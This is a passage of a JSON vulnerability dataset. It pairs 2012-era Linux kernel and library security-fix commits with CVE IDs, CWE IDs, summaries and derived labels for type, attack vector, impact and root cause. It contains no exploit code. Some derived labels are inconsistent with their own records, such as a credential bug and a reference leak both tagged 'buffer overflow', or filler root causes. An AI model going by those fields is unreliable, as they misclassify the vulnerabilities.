)","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"adee11b2085bee90bd8f4f52123ffb07882d6256","cve_id":"CVE-2012-3400","cwe_id":"CWE-119","commit_message":"udf: Avoid run away loop when partition table length is corrupted\n\nCheck provided length of partition table so that (possibly maliciously)\ncorrupted partition table cannot cause accessing data beyond current buffer.\n\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"Heap-based buffer overflow in the udf_load_logicalvol function in fs\/udf\/super.c in the Linux kernel before 3.4.5 allows remote attackers to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted UDF filesystem.","commit_message_1":"avoid run away loop when partition table length is corrupted check provided length of partition table so that ( possibly maliciously ) corrupted partition table can not cause accessing data beyond current buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted udf filesystem","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"13d518074a952d33d47c428419693f63389547e9","cve_id":"CVE-2012-3375","cwe_id":null,"commit_message":"epoll: clear the tfile_check_list on -ELOOP\n\nAn epoll_ctl(,EPOLL_CTL_ADD,,) operation can return '-ELOOP' to prevent\ncircular epoll dependencies from being created.  However, in that case we\ndo not properly clear the 'tfile_check_list'.  Thus, add a call to\nclear_tfile_check_list() for the -ELOOP case.\n\nSigned-off-by: Jason Baron <jbaron@redhat.com>\nReported-by: Yurij M. Plotnikov <Yurij.Plotnikov@oktetlabs.ru>\nCc: Nelson Elhage <nelhage@nelhage.com>\nCc: Davide Libenzi <davidel@xmailserver.org>\nTested-by: Alexandra N. Kossovsky <Alexandra.Kossovsky@oktetlabs.ru>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The epoll_ctl system call in fs\/eventpoll.c in the Linux kernel before 3.2.24 does not properly handle ELOOP errors in EPOLL_CTL_ADD operations, which allows local users to cause a denial of service (file-descriptor consumption and system crash) via a crafted application that attempts to create a circular epoll dependency.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2011-1083.","commit_message_1":"clear the tfile_check_list on -eloop an epoll_ctl ( , epoll_ctl_add , , ) operation can return '-eloop ' to prevent circular epoll dependency from being created","Vulnerability Type":"file-descriptor consumption and system crash","Attack Vector":"via a crafted application that attempts to create a circular epoll dependency","Impact":"cause a denial of service ( file - descriptor consumption and system crash )","Root Cause":"does not properly handle eloop errors","Attack Type":"local attacker"},{"commit_id":"79549c6dfda0603dba9a70a53467ce62d9335c33","cve_id":"CVE-2012-2745","cwe_id":"CWE-119","commit_message":"cred: copy_process() should clear child->replacement_session_keyring\n\nkeyctl_session_to_parent(task) sets ->replacement_session_keyring,\nit should be processed and cleared by key_replace_session_keyring().\n\nHowever, this task can fork before it notices TIF_NOTIFY_RESUME and\nthe new child gets the bogus ->replacement_session_keyring copied by\ndup_task_struct(). This is obviously wrong and, if nothing else, this\nleads to put_cred(already_freed_cred).\n\nchange copy_creds() to clear this member. If copy_process() fails\nbefore this point the wrong ->replacement_session_keyring doesn't\nmatter, exit_creds() won't be called.\n\nCc: <stable@vger.kernel.org>\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nAcked-by: David Howells <dhowells@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The copy_creds function in kernel\/cred.c in the Linux kernel before 3.3.2 provides an invalid replacement session keyring to a child process, which allows local users to cause a denial of service (panic) via a crafted application that uses the fork system call.","commit_message_1":"copy_process ( ) should clear child- > replacement_session_keyring keyctl_session_to_parent ( task ) set - > replacement_session_keyring , it should be processed and cleared by key_replace_session_keyring ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted application that uses the fork system call","Impact":"cause a denial of service ( panic )","Root Cause":"provides an invalid replacement session keyring to a child process","Attack Type":"local attacker"},{"commit_id":"9e2dcf72023d1447f09c47d77c99b0c49659e5ce","cve_id":"CVE-2012-2744","cwe_id":null,"commit_message":"netfilter: nf_conntrack_reasm: properly handle packets fragmented into a single fragment\n\nWhen an ICMPV6_PKT_TOOBIG message is received with a MTU below 1280,\nall further packets include a fragment header.\n\nUnlike regular defragmentation, conntrack also needs to \"reassemble\"\nthose fragments in order to obtain a packet without the fragment\nheader for connection tracking. Currently nf_conntrack_reasm checks\nwhether a fragment has either IP6_MF set or an offset != 0, which\nmakes it ignore those fragments.\n\nRemove the invalid check and make reassembly handle fragment queues\ncontaining only a single fragment.\n\nReported-and-tested-by: Ulrich Weber <uweber@astaro.com>\nSigned-off-by: Patrick McHardy <kaber@trash.net>","summary":"net\/ipv6\/netfilter\/nf_conntrack_reasm.c in the Linux kernel before 2.6.34, when the nf_conntrack_ipv6 module is enabled, allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) via certain types of fragmented IPv6 packets.","commit_message_1":"nf_conntrack_reasm : properly handle packet fragmented into a single fragment when an icmpv6_pkt_toobig message is received with a mtu below <number> , all further packet include a fragment header","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via certain types of fragmented ipv6 packets","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"e10c1eb9908c2774c16b3148b30d2f3823d66a9a","cve_id":"CVE-2012-2673","cwe_id":"CWE-189","commit_message":"Fix calloc() overflow\n\n* malloc.c (calloc): Check multiplication overflow in calloc(),\nassuming REDIRECT_MALLOC.","summary":"Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.","commit_message_1":"fix calloc ( ) overflow * <file> ( calloc ) : check multiplication overflow in calloc ( ) , assuming redirect_malloc","Vulnerability Type":"integer overflow","Attack Vector":"via a large size value, which causes less memory to be allocated than expected","Impact":"perform memory-related attacks","Root Cause":"caused by improper bounds checking by the malloc() and calloc() functions","Attack Type":"remote attacker"},{"commit_id":"bcc2c9c3fff859e0eb019fe6fec26f9b8eba795c","cve_id":"CVE-2012-2669","cwe_id":"CWE-20","commit_message":"Tools: hv: verify origin of netlink connector message\n\nThe SuSE security team suggested to use recvfrom instead of recv to be\ncertain that the connector message is originated from kernel.\n\nCVE-2012-2669\n\nSigned-off-by: Olaf Hering <olaf@aepfle.de>\nSigned-off-by: Marcus Meissner <meissner@suse.de>\nSigned-off-by: Sebastian Krahmer <krahmer@suse.de>\nSigned-off-by: K. Y. Srinivasan <kys@microsoft.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The main function in tools\/hv\/hv_kvp_daemon.c in hypervkvpd, as distributed in the Linux kernel before 3.4.5, does not validate the origin of Netlink messages, which allows local users to spoof Netlink communication via a crafted connector message.","commit_message_1":"hv : verify origin of netlink connector message the suse security team suggested to use recvfrom instead of recv to be certain that the connector message is originated from kernel","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted connector message","Impact":"spoof netlink communication","Root Cause":"does not validate the origin of netlink messages","Attack Type":"local attacker"},{"commit_id":"c50ac050811d6485616a193eb0f37bfbd191cc89","cve_id":"CVE-2012-2390","cwe_id":"CWE-399","commit_message":"hugetlb: fix resv_map leak in error path\n\nWhen called for anonymous (non-shared) mappings, hugetlb_reserve_pages()\ndoes a resv_map_alloc().  It depends on code in hugetlbfs's\nvm_ops->close() to release that allocation.\n\nHowever, in the mmap() failure path, we do a plain unmap_region() without\nthe remove_vma() which actually calls vm_ops->close().\n\nThis is a decent fix.  This leak could get reintroduced if new code (say,\nafter hugetlb_reserve_pages() in hugetlbfs_file_mmap()) decides to return\nan error.  But, I think it would have to unroll the reservation anyway.\n\nChristoph's test case:\n\n\thttp:\/\/marc.info\/?l=linux-mm&m=133728900729735\n\nThis patch applies to 3.4 and later.  A version for earlier kernels is at\nhttps:\/\/lkml.org\/lkml\/2012\/5\/22\/418.\n\nSigned-off-by: Dave Hansen <dave@linux.vnet.ibm.com>\nAcked-by: Mel Gorman <mel@csn.ul.ie>\nAcked-by: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nReported-by: Christoph Lameter <cl@linux.com>\nTested-by: Christoph Lameter <cl@linux.com>\nCc: Andrea Arcangeli <aarcange@redhat.com>\nCc: <stable@vger.kernel.org>\t[2.6.32+]\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Memory leak in mm\/hugetlb.c in the Linux kernel before 3.4.2 allows local users to cause a denial of service (memory consumption or system crash) via invalid MAP_HUGETLB mmap operations.","commit_message_1":"fix resv_map leak in error path when called for anonymous ( non-shared ) mapping , hugetlb_reserve_pages ( ) doe a resv_map_alloc ( )","Vulnerability Type":"Resource Management Errors","Attack Vector":"via invalid map _ hugetlb mmap operations","Impact":"cause a denial of service ( memory consumption or system crash )","Root Cause":"caused by a memory leak","Attack Type":"local attacker"},{"commit_id":"9791768705528e911bfca6c4d8aa88139035060e","cve_id":"CVE-2012-2385","cwe_id":"CWE-399","commit_message":"Cap escape sequence parameters to prevent long loops.\n\nFixes #271 github issue.","summary":"The terminal dispatcher in mosh before 1.2.1 allows remote authenticated users to cause a denial of service (long loop and CPU consumption) via an escape sequence with a large repeat count value.","commit_message_1":"cap escape sequence parameter to prevent long loop","Vulnerability Type":"Resource Management Errors","Attack Vector":"via an escape sequence with a large repeat count value","Impact":"cause a denial of service ( long loop and cpu consumption )","Root Cause":"caused by an error within mosh-server when processing commands","Attack Type":"remote attacker"},{"commit_id":"44afb3a04391a74309d16180d1e4f8386fdfa745","cve_id":"CVE-2012-2384","cwe_id":"CWE-189","commit_message":"drm\/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed (\"drm\/i915: Avoid\nallocation for execbuffer object list\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>","summary":"Integer overflow in the i915_gem_do_execbuffer function in drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.","commit_message_1":"fix integer overflow in i915_gem_do_execbuffer ( ) on <number>-bit system , a large args- > num_cliprects from userspace via ioctl may overflow the allocation size , leading to out-of-bounds access","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted ioctl call","Impact":"cause a denial of service ( out - of - bounds write ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"ed8cd3b2cd61004cab85380c52b1817aca1ca49b","cve_id":"CVE-2012-2383","cwe_id":"CWE-189","commit_message":"drm\/i915: fix integer overflow in i915_gem_execbuffer2()\n\nOn 32-bit systems, a large args->buffer_count from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 8408c282 (\"drm\/i915:\nFirst try a normal large kmalloc for the temporary exec buffers\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>","summary":"Integer overflow in the i915_gem_execbuffer2 function in drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.","commit_message_1":"fix integer overflow in i915_gem_execbuffer2 ( ) on <number>-bit system , a large args- > buffer_count from userspace via ioctl may overflow the allocation size , leading to out-of-bounds access","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted ioctl call","Impact":"cause a denial of service ( out - of - bounds write ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"20e0fa98b751facf9a1101edaefbc19c82616a68","cve_id":"CVE-2012-2375","cwe_id":"CWE-189","commit_message":"Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the\nuser passed buffer is passed the wrong size parameter when copying\ndata. res.acl_len contains both the bitmap and acl lenghts while\nacl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>","summary":"The __nfs4_get_acl_uncached function in fs\/nfs\/nfs4proc.c in the NFSv4 implementation in the Linux kernel before 3.3.2 uses an incorrect length variable during a copy operation, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words in an FATTR4_ACL reply.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-4131.","commit_message_1":"fix length of buffer copied in __nfs4_get_acl_uncached _copy_from_pages ( ) used to copy data from the temporary buffer to the user passed buffer is passed the wrong size parameter when copying data","Vulnerability Type":"Numeric Errors","Attack Vector":"by sending an excessive number of bitmap words in an FATTR4_ACL reply","Impact":"cause a denial of service ( oops )","Root Cause":"uses an incorrect length variable during a copy operation ","Attack Type":"remote attacker"},{"commit_id":"26c191788f18129af0eb32a358cdaea0c7479626","cve_id":"CVE-2012-2373","cwe_id":"CWE-362","commit_message":"mm: pmd_read_atomic: fix 32bit PAE pmd walk vs pmd_populate SMP race condition\n\nWhen holding the mmap_sem for reading, pmd_offset_map_lock should only\nrun on a pmd_t that has been read atomically from the pmdp pointer,\notherwise we may read only half of it leading to this crash.\n\nPID: 11679  TASK: f06e8000  CPU: 3   COMMAND: \"do_race_2_panic\"\n #0 [f06a9dd8] crash_kexec at c049b5ec\n #1 [f06a9e2c] oops_end at c083d1c2\n #2 [f06a9e40] no_context at c0433ded\n #3 [f06a9e64] bad_area_nosemaphore at c043401a\n #4 [f06a9e6c] __do_page_fault at c0434493\n #5 [f06a9eec] do_page_fault at c083eb45\n #6 [f06a9f04] error_code (via page_fault) at c083c5d5\n    EAX: 01fb470c EBX: fff35000 ECX: 00000003 EDX: 00000100 EBP:\n    00000000\n    DS:  007b     ESI: 9e201000 ES:  007b     EDI: 01fb4700 GS:  00e0\n    CS:  0060     EIP: c083bc14 ERR: ffffffff EFLAGS: 00010246\n #7 [f06a9f38] _spin_lock at c083bc14\n #8 [f06a9f44] sys_mincore at c0507b7d\n #9 [f06a9fb0] system_call at c083becd\n                         start           len\n    EAX: ffffffda  EBX: 9e200000  ECX: 00001000  EDX: 6228537f\n    DS:  007b      ESI: 00000000  ES:  007b      EDI: 003d0f00\n    SS:  007b      ESP: 62285354  EBP: 62285388  GS:  0033\n    CS:  0073      EIP: 00291416  ERR: 000000da  EFLAGS: 00000286\n\nThis should be a longstanding bug affecting x86 32bit PAE without THP.\nOnly archs with 64bit large pmd_t and 32bit unsigned long should be\naffected.\n\nWith THP enabled the barrier() in pmd_none_or_trans_huge_or_clear_bad()\nwould partly hide the bug when the pmd transition from none to stable,\nby forcing a re-read of the *pmd in pmd_offset_map_lock, but when THP is\nenabled a new set of problem arises by the fact could then transition\nfreely in any of the none, pmd_trans_huge or pmd_trans_stable states.\nSo making the barrier in pmd_none_or_trans_huge_or_clear_bad()\nunconditional isn't good idea and it would be a flakey solution.\n\nThis should be fully fixed by introducing a pmd_read_atomic that reads\nthe pmd in order with THP disabled, or by reading the pmd atomically\nwith cmpxchg8b with THP enabled.\n\nLuckily this new race condition only triggers in the places that must\nalready be covered by pmd_none_or_trans_huge_or_clear_bad() so the fix\nis localized there but this bug is not related to THP.\n\nNOTE: this can trigger on x86 32bit systems with PAE enabled with more\nthan 4G of ram, otherwise the high part of the pmd will never risk to be\ntruncated because it would be zero at all times, in turn so hiding the\nSMP race.\n\nThis bug was discovered and fully debugged by Ulrich, quote:\n\n----\n[..]\npmd_none_or_trans_huge_or_clear_bad() loads the content of edx and\neax.\n\n    496 static inline int pmd_none_or_trans_huge_or_clear_bad(pmd_t\n    *pmd)\n    497 {\n    498         \/* depend on compiler for an atomic pmd read *\/\n    499         pmd_t pmdval = *pmd;\n\n                                \/\/ edi = pmd pointer\n0xc0507a74 <sys_mincore+548>:   mov    0x8(%esp),%edi\n...\n                                \/\/ edx = PTE page table high address\n0xc0507a84 <sys_mincore+564>:   mov    0x4(%edi),%edx\n...\n                                \/\/ eax = PTE page table low address\n0xc0507a8e <sys_mincore+574>:   mov    (%edi),%eax\n\n[..]\n\nPlease note that the PMD is not read atomically. These are two \"mov\"\ninstructions where the high order bits of the PMD entry are fetched\nfirst. Hence, the above machine code is prone to the following race.\n\n-  The PMD entry {high|low} is 0x0000000000000000.\n   The \"mov\" at 0xc0507a84 loads 0x00000000 into edx.\n\n-  A page fault (on another CPU) sneaks in between the two \"mov\"\n   instructions and instantiates the PMD.\n\n-  The PMD entry {high|low} is now 0x00000003fda38067.\n   The \"mov\" at 0xc0507a8e loads 0xfda38067 into eax.\n----\n\nReported-by: Ulrich Obergfell <uobergfe@redhat.com>\nSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Hugh Dickins <hughd@google.com>\nCc: Larry Woodman <lwoodman@redhat.com>\nCc: Petr Matousek <pmatouse@redhat.com>\nCc: Rik van Riel <riel@redhat.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 3.4.5 on the x86 platform, when Physical Address Extension (PAE) is enabled, does not properly use the Page Middle Directory (PMD), which allows local users to cause a denial of service (panic) via a crafted application that triggers a race condition.","commit_message_1":"pmd_read_atomic : fix 32bit pae pmd walk v pmd_populate smp race condition when holding the mmap_sem for reading , pmd_offset_map_lock should only run on a pmd_t that ha been read atomically from the pmdp pointer , otherwise we may read only half of it leading to this crash","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted application that triggers a race condition","Impact":"cause a denial of service ( panic )","Root Cause":"when Physical Address Extension (PAE) is enabled, does not properly use the Page Middle Directory (PMD)","Attack Type":"local attacker"},{"commit_id":"6f24f892871acc47b40dd594c63606a17c714f77","cve_id":"CVE-2012-2319","cwe_id":"CWE-264","commit_message":"hfsplus: Fix potential buffer overflows\n\nCommit ec81aecb2966 (\"hfs: fix a potential buffer overflow\") fixed a few\npotential buffer overflows in the hfs filesystem.  But as Timo Warns\npointed out, these changes also need to be made on the hfsplus\nfilesystem as well.\n\nReported-by: Timo Warns <warns@pre-sense.de>\nAcked-by: WANG Cong <amwang@redhat.com>\nCc: Alexey Khoroshilov <khoroshilov@ispras.ru>\nCc: Miklos Szeredi <mszeredi@suse.cz>\nCc: Sage Weil <sage@newdream.net>\nCc: Eugene Teo <eteo@redhat.com>\nCc: Roman Zippel <zippel@linux-m68k.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Christoph Hellwig <hch@lst.de>\nCc: Alexey Dobriyan <adobriyan@gmail.com>\nCc: Dave Anderson <anderson@redhat.com>\nCc: stable <stable@vger.kernel.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Multiple buffer overflows in the hfsplus filesystem implementation in the Linux kernel before 3.3.5 allow local users to gain privileges via a crafted HFS plus filesystem, a related issue to CVE-2009-4020.","commit_message_1":"fix potential buffer overflow commit ec81aecb2966 ( `` hf : fix a potential buffer overflow '' ) fixed a few potential buffer overflow in the hf filesystem","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted hfs plus filesystem , a related issue to cve - 2009 - 4020","Impact":"gain privileges","Root Cause":"caused by improper bounds checking by the driver within HFS plus filesystem","Attack Type":"local attacker"},{"commit_id":"1bb57e940e1958e40d51f2078f50c3a96a9b2d75","cve_id":"CVE-2012-2313","cwe_id":"CWE-264","commit_message":"dl2k: Clean up rio_ioctl\n\nThe dl2k driver's rio_ioctl call has a few issues:\n- No permissions checking\n- Implements SIOCGMIIREG and SIOCGMIIREG using the SIOCDEVPRIVATE numbers\n- Has a few ioctls that may have been used for debugging at one point\n  but have no place in the kernel proper.\n\nThis patch removes all but the MII ioctls, renumbers them to use the\nstandard ones, and adds the proper permission check for SIOCSMIIREG.\n\nWe can also get rid of the dl2k-specific struct mii_data in favor of\nthe generic struct mii_ioctl_data.\n\nSince we have the phyid on hand, we can add the SIOCGMIIPHY ioctl too.\n\nMost of the MII code for the driver could probably be converted to use\nthe generic MII library but I don't have a device to test the results.\n\nReported-by: Stephan Mueller <stephan.mueller@atsec.com>\nSigned-off-by: Jeff Mahoney <jeffm@suse.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rio_ioctl function in drivers\/net\/ethernet\/dlink\/dl2k.c in the Linux kernel before 3.3.7 does not restrict access to the SIOCSMIIREG command, which allows local users to write data to an Ethernet adapter via an ioctl call.","commit_message_1":"clean up rio_ioctl the dl2k driver 's rio_ioctl call ha a few issue : - no permission checking - implement siocgmiireg and siocgmiireg using the siocdevprivate number - ha a few ioctls that may have been used for debugging at one point but have no place in the kernel proper","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via an ioctl call","Impact":"write data to an ethernet adapter","Root Cause":"does not restrict access to the siocsmiireg command","Attack Type":"local attacker"},{"commit_id":"cc9b17ad29ecaa20bfe426a8d4dbfb94b13ff1cc","cve_id":"CVE-2012-2136","cwe_id":"CWE-20","commit_message":"net: sock: validate data_len before allocating skb in sock_alloc_send_pskb()\n\nWe need to validate the number of pages consumed by data_len, otherwise frags\narray could be overflowed by userspace. So this patch validate data_len and\nreturn -EMSGSIZE when data_len may occupies more frags than MAX_SKB_FRAGS.\n\nSigned-off-by: Jason Wang <jasowang@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sock_alloc_send_pskb function in net\/core\/sock.c in the Linux kernel before 3.4.5 does not properly validate a certain length value, which allows local users to cause a denial of service (heap-based buffer overflow and system crash) or possibly gain privileges by leveraging access to a TUN\/TAP device.","commit_message_1":"sock : validate data_len before allocating skb in sock_alloc_send_pskb ( ) we need to validate the number of page consumed by data_len , otherwise frags array could be overflowed by userspace","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging access to a tun \/ tap device","Impact":"cause a denial of service ( heap - based buffer overflow and system crash ) or possibly gain privileges","Root Cause":"does not properly validate a certain length value","Attack Type":"local attacker"},{"commit_id":"90481622d75715bfcb68501280a917dbfe516029","cve_id":"CVE-2012-2133","cwe_id":"CWE-399","commit_message":"hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https:\/\/lkml.org\/lkml\/2011\/8\/11\/28 or\nhttp:\/\/marc.info\/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.","commit_message_1":"fix use after free bug in `` quota '' handling hugetlbfs_ { get , put } _quota ( ) are badly named","Vulnerability Type":"Resource Management Errors","Attack Vector":"by interacting with a hugetlbfs filesystem , as demonstrated by a umount operation that triggers improper handling of quota data","Impact":"cause a denial of service ( system crash ) or possibly gain privileges","Root Cause":"when huge pages are enabled","Attack Type":"local attacker"},{"commit_id":"905ad269c55fc62bee3da29f7b1d1efeba8aa1e1","cve_id":"CVE-2012-2127","cwe_id":"CWE-119","commit_message":"procfs: fix a vfsmount longterm reference leak\n\nkern_mount() doesn't pair with plain mntput()...\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"fs\/proc\/root.c in the procfs implementation in the Linux kernel before 3.2 does not properly interact with CLONE_NEWPID clone system calls, which allows remote attackers to cause a denial of service (reference leak and memory consumption) by making many connections to a daemon that uses PID namespaces to isolate clients, as demonstrated by vsftpd.","commit_message_1":"fix a vfsmount longterm reference leak kern_mount ( ) doe n't pair with plain mntput ( )","Vulnerability Type":"buffer overflow","Attack Vector":"by making many connections to a daemon that uses pid namespaces to isolate clients , as demonstrated by vsftpd","Impact":"cause a denial of service ( reference leak and memory consumption )","Root Cause":"does not properly interact with clone _ newpid clone system calls ","Attack Type":"remote attacker"},{"commit_id":"d52fc5dde171f030170a6cb78034d166b13c9445","cve_id":"CVE-2012-2123","cwe_id":"CWE-264","commit_message":"fcaps: clear the same personality flags as suid when fcaps are used\n\nIf a process increases permissions using fcaps all of the dangerous\npersonality flags which are cleared for suid apps should also be cleared.\nThus programs given priviledge with fcaps will continue to have address space\nrandomization enabled even if the parent tried to disable it to make it\neasier to attack.\n\nSigned-off-by: Eric Paris <eparis@redhat.com>\nReviewed-by: Serge Hallyn <serge.hallyn@canonical.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The cap_bprm_set_creds function in security\/commoncap.c in the Linux kernel before 3.3.3 does not properly handle the use of file system capabilities (aka fcaps) for implementing a privileged executable file, which allows local users to bypass intended personality restrictions via a crafted application, as demonstrated by an attack that uses a parent process to disable ASLR.","commit_message_1":"clear the same personality flag a suid when fcaps are used if a process increase permission using fcaps all of the dangerous personality flag which are cleared for suid apps should also be cleared","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application , as demonstrated by an attack that uses a parent process to disable aslr","Impact":"bypass intended personality restrictions","Root Cause":"does not properly handle the use of file system capabilities ( aka fcaps ) for implementing a privileged executable file","Attack Type":"local attacker"},{"commit_id":"09ca8e1173bcb12e2a449698c9ae3b86a8a10195","cve_id":"CVE-2012-2121","cwe_id":"CWE-264","commit_message":"KVM: unmap pages from the iommu when slots are removed\n\ncommit 32f6daad4651a748a58a3ab6da0611862175722f upstream.\n\nWe've been adding new mappings, but not destroying old mappings.\nThis can lead to a page leak as pages are pinned using\nget_user_pages, but only unpinned with put_page if they still\nexist in the memslots list on vm shutdown.  A memslot that is\ndestroyed while an iommu domain is enabled for the guest will\ntherefore result in an elevated page reference count that is\nnever cleared.\n\nAdditionally, without this fix, the iommu is only programmed\nwith the first translation for a gpa.  This can result in\npeer-to-peer errors if a mapping is destroyed and replaced by a\nnew mapping at the same gpa as the iommu will still be pointing\nto the original, pinned memory address.\n\nSigned-off-by: Alex Williamson <alex.williamson@redhat.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The KVM implementation in the Linux kernel before 3.3.4 does not properly manage the relationships between memory slots and the iommu, which allows guest OS users to cause a denial of service (memory leak and host OS crash) by leveraging administrative access to the guest OS to conduct hotunplug and hotplug operations on devices.","commit_message_1":"unmap page from the iommu when slot are removed commit 32f6daad4651a748a58a3ab6da0611862175722f upstream","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging administrative access to the guest os to conduct hotunplug and hotplug operations on devices","Impact":"cause a denial of service ( memory leak and host os crash )","Root Cause":"does not properly manage the relationships between memory slots and the iommu","Attack Type":"local 